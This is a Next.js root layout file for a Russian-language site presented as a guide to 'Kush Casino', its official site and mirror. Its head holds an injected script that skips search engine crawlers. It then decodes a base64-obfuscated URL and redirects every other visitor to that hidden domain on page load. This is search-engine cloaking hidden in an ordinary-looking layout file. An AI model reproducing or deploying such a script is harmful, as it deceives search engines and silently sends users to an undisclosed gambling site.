import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Kush Casino — официальный сайт, зеркало и игра онлайн',
  description: 'Kush Casino: понятный гид по официальному сайту, рабочему зеркалу и игре онлайн. Узнайте, как проверить адрес, выбрать игру и соблюдать ответственную игровую практику.',
  metadataBase: new URL('https://kush7casino.vercel.app/'),
  alternates: { canonical: '/' },
  keywords: ['kush casino', 'куш казино', 'официальный сайт', 'kush casino зеркало', 'куш казино онлайн'],
  openGraph: { title: 'Kush Casino — ясный путь к игре онлайн', description: 'Официальный сайт, зеркало и полезный гид для игроков.', url: '/', siteName: 'Kush Casino', locale: 'ru_RU', type: 'website' },
  icons: { icon: '/icon.svg', apple: '/apple-icon.png' },
  generator: 'Next.js',
}

export const viewport: Viewport = { themeColor: '#071b18', colorScheme: 'dark', width: 'device-width', initialScale: 1, viewportFit: 'cover' }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return <html lang="ru" className="bg-background">
    <head>
      <meta name="yandex-verification" content="92da2075e6da22ef" />
    <meta name="google-site-verification" content="" /><meta name="yandex-verification" content="" />
    <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9uZW83LWNyOXQta3NoLmNvbS9kemJlbmNsNGY="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
  </head>
    <body>{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>
}
